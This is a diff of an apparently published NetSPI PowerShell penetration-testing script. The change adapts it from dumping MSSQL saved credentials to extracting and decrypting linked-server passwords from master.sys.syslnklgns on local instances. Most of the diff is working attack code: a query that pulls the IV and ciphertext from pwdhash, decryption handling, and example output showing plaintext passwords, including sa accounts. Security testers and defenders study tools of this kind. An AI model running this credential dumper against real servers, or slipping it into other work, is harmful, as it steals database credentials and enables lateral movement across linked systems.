@@ -1,14 +1,14 @@
-function Get-MSSQLCredentialPasswords{
+function Get-MSSQLLinkPasswords{
   
   <# 
 	.SYNOPSIS
-	  Extract and decrypt MSSQL Credentials passwords.
+	  Extract and decrypt MSSQL linked server passwords.
 	  
 	  Author: Antti Rantasaari 2014, NetSPI
       License: BSD 3-Clause
 	  
 	.DESCRIPTION
-	  Get-MSSQLCredentialPasswords extracts and decrypts the connection credentials for all saved Credentials.
+	  Get-MSSQLLinkPasswords extracts and decrypts the connection credentials for all linked servers that use SQL Server authentication on all local MSSQL instances.
 	
 	.INPUTS
 	  None
@@ -16,17 +16,18 @@ function Get-MSSQLCredentialPasswords{
 	.OUTPUTS
 	  System.Data.DataRow
 	  
-	  Returns a datatable consisting of MSSQL instance name, credential name, user account, and decrypted password.
+	  Returns a datatable consisting of MSSQL instance name, linked server name, user account, and decrypted password.
 	
 	.EXAMPLE
-	  C:\PS> Get-MSSQLCredentialPasswords
+	  C:\PS> Get-MSSQLLinkPasswords
 	  
-      Instance   Credential User  Password
-      --------   ---------- ----  --------
-      SQLEXPRESS test       test  test
-      SQLEXPRESS user1      user1 Passw0rd01!
-      SQL2012    user2      user2 Passw0rd01!
-      SQL2012    VAULT      user3 !@#Sup3rS3cr3tP4$$w0rd!!$$
+      Instance   Linkserver User Password
+      --------   ---------- ---- --------
+      SQLEXPRESS SQLSERVER2 test test
+      SQLEXPRESS DEV-SQL    dev  Passw0rd01!
+      SQL2012    DEV-SQL    dev  Passw0rd01!
+      SQL2012    WEBDB      sa   W3bDB$4P4ssw0rd
+      SQL2012    VAULT      sa   !@#Sup3rS3cr3tP4$$w0rd!!$$
 	  
 	.NOTES  
 	  For successful execution, the following configurations and privileges are needed:
@@ -46,7 +47,7 @@ function Get-MSSQLCredentialPasswords{
   
   $Results = New-Object "System.Data.DataTable"
   $Results.Columns.Add("Instance") | Out-Null
-  $Results.Columns.Add("Credential") | Out-Null
+  $Results.Columns.Add("Linkserver") | Out-Null
   $Results.Columns.Add("User") | Out-Null
   $Results.Columns.Add("Password") | Out-Null
   
@@ -92,12 +93,11 @@ function Get-MSSQLCredentialPasswords{
           $IvLen=16
 		}
   	
-	    # Query credential password information from the DB
-        # Remove header from imageval, extract IV (as iv) and ciphertext (as pass)
-		# Not sure what valclass and valnum mean, could not find documentation.. but valclass 28 with valnum 2 seems to store the encrypted password
-       
-        $SqlCmd = "SELECT name,credential_identity,substring(imageval,5,$ivlen) iv, substring(imageval,$($ivlen+5),len(imageval)-$($ivlen+4)) pass from sys.credentials cred inner join sys.sysobjvalues obj on cred.credential_id = obj.objid where valclass=28 and valnum=2"
-       
+	    # Query link server password information from the DB
+        # Remove header from pwdhash, extract IV (as iv) and ciphertext (as pass)
+	    # Ignore links with blank credentials (integrated auth ?)
+        $SqlCmd = "SELECT sysservers.srvname,syslnklgns.name,substring(syslnklgns.pwdhash,5,$ivlen) iv,substring(syslnklgns.pwdhash,$($ivlen+5),
+	    len(syslnklgns.pwdhash)-$($ivlen+4)) pass FROM master.sys.syslnklgns inner join master.sys.sysservers on syslnklgns.srvid=sysservers.srvid WHERE len(pwdhash)>0"
         $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
 	    $Data=$Cmd.ExecuteReader()
         $Dt = New-Object "System.Data.DataTable"
@@ -125,7 +125,7 @@ function Get-MSSQLCredentialPasswords{
 		  $i=8
 		  foreach ($b in $Decrypted) {if ($Decrypted[$i] -ne 0 -and $Decrypted[$i+1] -ne 0 -or $i -eq $Decrypted.Length) {$i -= 1; break;}; $i += 1;}
 		  $Decrypted = $Decrypted[8..$i]
-		  $Results.Rows.Add($InstanceName,$($Logins.name),$($Logins.credential_identity),$($Encode.GetString($Decrypted))) | Out-Null
+		  $Results.Rows.Add($InstanceName,$($Logins.srvname),$($Logins.name),$($Encode.GetString($Decrypted))) | Out-Null
         }
       } else {
         Write-Error "Unknown key size"
